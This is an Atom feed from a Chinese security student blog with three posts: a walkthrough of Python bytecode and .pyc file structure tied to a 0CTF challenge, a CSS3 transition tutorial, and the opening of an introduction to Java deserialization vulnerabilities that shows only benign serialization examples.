<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小黑屋</title>
  <subtitle>一群专注安全的小伙们</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://das.scusec.org/"/>
  <updated>2017-03-27T03:30:42.343Z</updated>
  <id>http://das.scusec.org/</id>
  
  <author>
    <name>das</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python与它的opcode</title>
    <link href="http://das.scusec.org/2017/03/24/pythonopcode/"/>
    <id>http://das.scusec.org/2017/03/24/pythonopcode/</id>
    <published>2017-03-24T07:26:29.000Z</published>
    <updated>2017-03-27T03:30:42.343Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/phantom/opcode.jpg" alt=""></p>
<p>0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~</p>
<a id="more"></a>
<h2 id="0x01-PyCodeObject"><a href="#0x01-PyCodeObject" class="headerlink" title="0x01 PyCodeObject"></a>0x01 PyCodeObject</h2><p>Python代码在运行时，将我们写的源码转换成字节码，再由python解释器来执行字节码。而字节码就是一个PyCodeObject对象。一个相应的对象如下：文件在/include/code.h</p>
<pre><code>/* Bytecode object */
typedef struct {
    PyObject_HEAD
    int co_argcount;        /* #arguments, except *args */
    int co_nlocals;        /* #local variables */
    int co_stacksize;        /* #entries needed for evaluation stack */
    int co_flags;        /* CO_..., see below */
    PyObject *co_code;        /* 编译所得的字节码指令序列 */
    PyObject *co_consts;    /* Block中所有常量的元组 */
    PyObject *co_names;        /* 所有名字的元组 */
    PyObject *co_varnames;    /* 在本代码段中赋值，但没有被内层代码引用的变量*/
    PyObject *co_freevars;    /* 在本层引用，在外层赋值的变量*/
    PyObject *co_cellvars;      /* 本层赋值，且被内层代码段引用的变量*/
    /* The rest doesn&apos;t count for hash/cmp */
    PyObject *co_filename;    /* python文件路径*/
    PyObject *co_name;        /* 函数名或类名*/
    int co_firstlineno;        /* Block所在的起始行*/
    PyObject *co_lnotab;    /* 字节码指令与pyc文件中的source code对应关系*/
    void *co_zombieframe;     /* 优化(see frameobject.c) */
    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
} PyCodeObject;
</code></pre><p>从这个定义中，我们可以简单了解一下，该对象有哪些参数组成：</p>
<p>1 co_argcount，一个Code Bloack的参数计数。</p>
<p>作为萌新，这里再多提一下python中的几种参数形式,python中的参数形式可以分成位置参数和关键字参数两类，位置参数即参数所在的位置影响它被处理的逻辑，关键字参数即参数所在的位置与它的处理逻辑无关。</p>
<p>另一个概念是，Code Block，这个概念是说我们所写的Python代码中的每一个名字空间在编译时都会对应一个Code Block，每一个Block会创建一个PyCodeObject对象</p>
<p>那么这样的话，我们就可以理解这个参数做了什么，我们写一段代码来做个测试，看这样一段代码：</p>
<pre><code>def co_arg(fn):
    print fn.__name__,fn.__code__.co_argcount
@co_arg
def f1():
    pass
@co_arg
def f2(a):
    pass
@co_arg
def f3(a,b):
    pass
@co_arg
def f4(a,b=1):
    pass
@co_arg
def f5(a,b,*c):
    pass
@co_arg
def f6(a,b,*c,**d):
    pass
</code></pre><p>执行结果如下：</p>
<pre><code>&gt;&gt;f1 0
&gt;&gt;f2 1
&gt;&gt;f3 2
&gt;&gt;f4 2
&gt;&gt;f5 2
&gt;&gt;f6 2
</code></pre><p>OK，我们可以看到这个变量记录了函数的参数个数，但不记录tuple参数和dict参数</p>
<p>2 co_nlocals，一个Code Bloack的局部变量计数，包括所有参数和局部变量。</p>
<p>同样看如下代码：</p>
<pre><code>def co_nlo(fn):
    print fn.__name__,fn.__code__.co_nlocals
@co_nlo
def f1():
    pass
@co_nlo
def f2(a):
    pass
@co_nlo
def f3(a):
    b=1
@co_nlo
def f4(a,*b,**c):
    d=1
</code></pre><p>执行结果：</p>
<pre><code>&gt;&gt;f1 0
&gt;&gt;f2 1
&gt;&gt;f3 2
&gt;&gt;f4 4
</code></pre><p>3 co_stacksize,运行这段Code Block需要的栈空间</p>
<p>剩下的解释就直接标注在上面的type结构中。</p>
<p>了解过PyCodeObject后，我们就可以来看看pyc，一般情况下，翻译的字节码会写入内存中，当程序结束后，会根据程序运行的方式来决定是否将字节码写入pyc或者其他格式的存储文件中。</p>
<p>我们来看一下一个简单的pyc文件。</p>
<h2 id="0x02-pyc"><a href="#0x02-pyc" class="headerlink" title="0x02 pyc"></a>0x02 pyc</h2><p>我们编译如下代码到pyc来进行学习：</p>
<pre><code>def foo():
    print 1
if __name__ == &apos;__main__&apos;:
    foo()
</code></pre><blockquote>
<p>python -m py_compile hello.py</p>
</blockquote>
<p>编译后的代码如下：</p>
<p><img src="http://123.207.68.169/achiveimg/20170324171322.jpg" alt=""></p>
<p>看上述pyc图，头4个字节，<em>03f3 0d0a</em> 是pyc的MAGIC数，用来表示python的版本。接下来的4个字节是时间。头声明完后的是一个Block的开头，即为63，后面的4个字节是PyObject中的argument数，这里为0，接着4个字节是nlocals，这里还是0。接着是4个字节的栈空间<em>，0200 0000</em>。</p>
<p>接着4个字节的flags <em>4000 0000</em>。flag后面就是一些具体到代码的字节码。</p>
<p>开始是co_code，0x73，代表类型s（string），接下来的4个字节代表长度  2300 0000<br>使用小端模式，表示有35个字节长度。</p>
<p>接下来我们向后取35个字节长度，这时的字节码就可以对应上opcode，都2个字节对应相应opcode操作，如果操作后带有值，那么就在紧跟其后的4个字节中表示。</p>
<p>完整的版本如下：</p>
<pre><code>03f3 0d0a 版本
76e2 d458 时间
63  block
0000 0000 argument
0000 0000 nlocals
0200 0000 栈空间
4000 0000 flags
73 类型 string
2300 0000 长度 35 bytes
64 00 00 LOAD_CONST  0
84 00 00 MAKE_FUNCTION 0
5a 00 00 STORE_NAME 0
65 01 00 LOAD_NAME 1
64 01 00 LOAD_CONST 1
6b 02 00 COMPARE_OP 2
72 1f 00 POP_JUMP_IF_FALSE
65 00 00 LOAD_NAME 0
83 00 00 CALL_FUNCTION 0
01 POP_TOP
6e 00 00 JUMP_FORWARD 0
64 02 00 LOAD_CONST 2
53 RETURN_VALUE

28 (
0300 0000 

63 
0000 0000
0000 0000
0100 0000
4300 0000
73 
0900 0000 
64 01 00
47
48
64 00 00 
53

28 (
0200 0000 
4e N
69 0100 0000 1

28 (
0000 0000
28 (
0000 0000 
28 (
0000 0000
28 (
0000 0000 

73 string  co_filename
3000 0000
屏蔽敏感信息

74 t co_name
0300 0000 
666f6f  foo

0100 0000
73 
0200 0000 
00 01 
74
0800 0000
5f5f 6d61 696e 5f5f

4e N
28
0200 0000
52 R
0000 0000 
74
0800 0000
5f 5f6e 616d 655f5f

28 0000 0000 
28 0000 0000
28 0000 0000

73  co_filename
30 0000 00
屏蔽敏感信息

74  co_name
0800 0000 
3c6d 6f64 756c 653e &lt;module&gt;

0100 0000 

73
0400 0000
0903 0c01 lnotab
</code></pre><p>解释一下，第一个block其实可以看成是main主程序的执行，第二个block就是foo函数中执行print的逻辑。</p>
<p>看这两张图，在对比我上面的字节码，应该就能懂了。</p>
<p>block 1</p>
<p><img src="http://123.207.68.169/achiveimg/20170324204233.jpg" alt=""></p>
<p>block 2</p>
<p><img src="http://123.207.68.169/achiveimg/20170324204343.jpg" alt=""></p>
<p>而opcode对应的操作，可以查看python目录下的opcode.py</p>
<h2 id="0x03-一道0ctf题"><a href="#0x03-一道0ctf题" class="headerlink" title="0x03 一道0ctf题"></a>0x03 一道0ctf题</h2><p>在明白了上述原理后，可以参考这篇文章</p>
<p><a href="http://0x48.pw/2017/03/20/0x2f/" target="_blank" rel="external">http://0x48.pw/2017/03/20/0x2f/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/phantom/opcode.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://das.scusec.org/categories/python/"/>
    
    
      <category term="opcode" scheme="http://das.scusec.org/tags/opcode/"/>
    
      <category term="python" scheme="http://das.scusec.org/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CSS3之transition学习</title>
    <link href="http://das.scusec.org/2017/03/06/css3-transition/"/>
    <id>http://das.scusec.org/2017/03/06/css3-transition/</id>
    <published>2017-03-06T12:20:00.000Z</published>
    <updated>2017-03-06T12:35:54.258Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://p1.bqimg.com/567571/51c6e7ca6bb7e775.jpg" alt=""></p>
<p>在做网页时,经常会引入图片,然后发现transition这个属性对于图片特别实用。<br><a id="more"></a></p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这周要分享的是我学习的一个css3特性：css3过渡特性:transition。</p>
<p>这个属性很特别，几行简单的css代码，就能实现很炫酷的动画效果。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>transition这个过渡属性的简单介绍：</p>
<p>我们可以在不使用 Flash 动画或 JavaScript 的情况下，当元素从一种样式变换为另一种样式时为元素添加效果。</p>
<p>它的代码为:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span><br><span class="line"><span class="tag">div</span> </span><br><span class="line"><span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">width</span>:<span class="value"><span class="number">100px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">height</span>:<span class="value"><span class="number">100px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">background</span>:<span class="value">yellow</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-transition</span>:<span class="value">width <span class="number">2s</span></span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"><span class="tag">div</span><span class="pseudo">:hover</span></span><br><span class="line"><span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">width</span>:<span class="value"><span class="number">300px</span></span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span>&gt;</span><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span>&gt;</span>请把鼠标指针放到黄色的div元素上，来查看过渡效果。<span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>过渡transition是一个复合属性，包括transition-property、transition-duration、transition-timing-function、transition-delay这四个子属性。通过这四个子属性的配合来完成一个完整的过渡效果</strong></p>
<ul>
<li><strong>transition-property</strong>: 过渡属性(默认值为all)</li>
<li><strong>transition-duration</strong>: 过渡持续时间(默认值为0s)</li>
<li><strong>transiton-timing-function</strong>: 过渡函数(默认值为ease函数)</li>
<li><strong>transition-delay</strong>: 过渡延迟时间(默认值为0s)</li>
<li>过渡transition的这四个子属性只有<transition-duration>是必需值且不能为0</transition-duration></li>
<li>注意：Internet Explorer 10、Firefox、Chrome 以及 Opera 支持 transition 属性。<br>Safari 和Chrome需要前缀 -webkit-。</li>
</ul>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>使用transition给单个图片添加旋转拉近动画效果，通过这个属性要实现的功能是：鼠标经过图片，图片不仅旋转，而且图片的投影拉长，图片比例变大，形成了图片从墙面上浮起来的炫酷效果。效果图就是：</p>
<p> <img src="http://i1.piimg.com/567571/877e92c1bf810d93.png" alt=""></p>
<p>当鼠标放在长颈鹿上时，就感觉他从纸中跳出来一样</p>
<p>它的代码为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span><br><span class="line"><span class="class">.box</span><span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">margin</span>:<span class="value"><span class="number">100px</span> <span class="number">365px</span> <span class="number">120px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">display</span>:<span class="value">block</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">width</span>:<span class="value"><span class="number">350px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">border-style</span>:<span class="value">solid</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">border-color</span>:<span class="value">grey</span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"><span class="class">.pic</span><span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">display</span>:<span class="value">block</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">width</span>:<span class="value"><span class="number">300px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">height</span>:<span class="value"><span class="number">300px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">margin</span>:<span class="value"><span class="number">10px</span> <span class="number">10px</span> <span class="number">10px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">padding</span>:<span class="value"><span class="number">10px</span> <span class="number">10px</span> <span class="number">15px</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">border-color</span>:<span class="value">yellow</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-transform</span>:<span class="value"><span class="function">rotate</span>(<span class="number">30deg</span>)</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-box-shadow</span>:<span class="value"><span class="number">2px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="function">rgba</span>(<span class="number">135</span>,<span class="number">139</span>,<span class="number">144</span>,<span class="number">0.4</span>)</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-transition</span>:<span class="value">all <span class="number">1s</span> ease-in</span></span>;</span><br><span class="line">&#125;</span></span><br><span class="line"><span class="class">.pic</span><span class="pseudo">:hover</span>,<span class="class">.pic</span><span class="pseudo">:focus</span>,<span class="class">.pic</span><span class="pseudo">:active</span><span class="rules">&#123;</span><br><span class="line">  <span class="rule"><span class="attribute">border-color</span>:<span class="value"><span class="hexcolor">#9a9a9a</span></span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-box-shadow</span>:<span class="value"><span class="number">15px</span> <span class="number">15px</span> <span class="number">20px</span> <span class="function">rgba</span>(<span class="number">50</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">0.4</span>)</span></span>;</span><br><span class="line">  <span class="rule"><span class="attribute">-webkit-transform</span>:<span class="value"><span class="function">rotate</span>(<span class="number">0deg</span>) <span class="function">scale</span>(<span class="number">1.5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">div</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"E:\2017\yanyixia\feburay\2.20-2.23\2.20\长颈鹿.jpg"</span>  <span class="attribute">class</span>=<span class="value">"pic"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">ml</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过比较这个代码和之前的代码，你会发现它增加了盒阴影样式：<code>-webkit-box-shadow</code>,通过这个属性，它加大了投影的偏移，以及模糊的大小，同时投影的颜色也增加了。另外增加了-webkit-transform:rotate(0deg),scale(1.5)这个属性，通过这个属性使得动画效果更加明显。</p>
<p>下面讲解一下box-shadow这个属性:</p>
<ul>
<li>语法</li>
<li>box-shadow: h-shadow v-shadow blur spread color inset;</li>
<li>其中水平阴影和垂直阴影是必需。其它四个选项是可选项。</li>
</ul>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>将单个图片的悬浮效果应用到多张图片上，就有了图片墙的图片悬浮动画效果了。它能实现的效果为：</p>
<p><img src="http://i1.piimg.com/567571/561599f91070c826.png" alt=""></p>
<p>它的代码中需注意的是: <strong>每张图片的a标签采用绝对定位，鼠标经过改变z-index使其顶层显示</strong></p>
<p>其中 <code>z-index</code> 这个代码很重要。<code>z-index</code>属性设置元素的堆叠顺序，拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。并且这个属性仅能在定位元素上奏效。</p>
<p>参考链接：</p>
<p><a href="http://www.360doc.com/content/14/0313/23/2961511_360409154.shtml" target="_blank" rel="external">http://www.360doc.com/content/14/0313/23/2961511_360409154.shtml</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://p1.bqimg.com/567571/51c6e7ca6bb7e775.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在做网页时,经常会引入图片,然后发现transition这个属性对于图片特别实用。&lt;br&gt;
    
    </summary>
    
      <category term="开发笔记" scheme="http://das.scusec.org/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="zyy" scheme="http://das.scusec.org/tags/zyy/"/>
    
  </entry>
  
  <entry>
    <title>JAVA反序列化漏洞</title>
    <link href="http://das.scusec.org/2017/03/06/Unserialize_vulnerabilities/"/>
    <id>http://das.scusec.org/2017/03/06/Unserialize_vulnerabilities/</id>
    <published>2017-03-06T09:26:27.737Z</published>
    <updated>2017-03-06T09:26:27.737Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/87e3e6e05ca78561.jpg" alt=""><br>很多JAVA应用反序列化时并没有限制实例化对象的类型，导致可以任意构造应用中已经包含的对象利用反序列化操作进行实例化，比如任意命令执行等。<br><a id="more"></a></p>
<h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。大多数编程语言都提供内置的方法来实现这两个过程。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。<br><img src="http://p1.bqimg.com/567571/2224a823829b8146.png" alt=""></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        String name = <span class="string">"bob"</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(name);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        String nameFromDisk = (String)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(nameFromDisk);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">breens@us<span class="operator">-l</span>-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob</span><br><span class="line">breens@us<span class="operator">-l</span>-breens:~/Desktop/SerialTest$ xxd name.ser</span><br><span class="line"><span class="number">0000000</span>: aced <span class="number">0005</span> <span class="number">7400</span> <span class="number">0362</span> <span class="number">6</span>f62 ....t..bob</span><br></pre></td></tr></table></figure>
<p>可以看到”name.ser”里的字符串可以被人眼识别，但其他信息已经被转换为二进制数据了。注意文件开头的“<strong>aced 0005</strong>”，这表示一切序列化后的java对象开头的两个字节。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"bob"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="keyword">this</span>.name+<span class="string">"!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">breens@us<span class="operator">-l</span>-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob!</span><br><span class="line">breens@us<span class="operator">-l</span>-breens:~/Desktop/SerialTest$ xxd object.ser</span><br><span class="line"><span class="number">0000000</span>: aced <span class="number">0005</span> <span class="number">7372</span> <span class="number">0008</span> <span class="number">4</span>d79 <span class="number">4</span>f62 <span class="number">6</span>a65 <span class="number">6374</span> ....sr..MyObject</span><br><span class="line"><span class="number">0000010</span>: cf7a <span class="number">75</span>c5 <span class="number">5</span>dba f698 <span class="number">0200</span> <span class="number">014</span>c <span class="number">0004</span> <span class="number">6</span>e61 .zu.]......L..na</span><br><span class="line"><span class="number">0000020</span>: <span class="number">6</span>d65 <span class="number">7400</span> <span class="number">124</span>c <span class="number">6</span>a61 <span class="number">7661</span> <span class="number">2</span>f6c <span class="number">616</span>e <span class="number">672</span>f met..Ljava/lang/</span><br><span class="line"><span class="number">0000030</span>: <span class="number">5374</span> <span class="number">7269</span> <span class="number">6</span>e67 <span class="number">3</span>b78 <span class="number">7074</span> <span class="number">0003</span> <span class="number">626</span>f <span class="number">62</span> String;xpt..bob</span><br></pre></td></tr></table></figure>
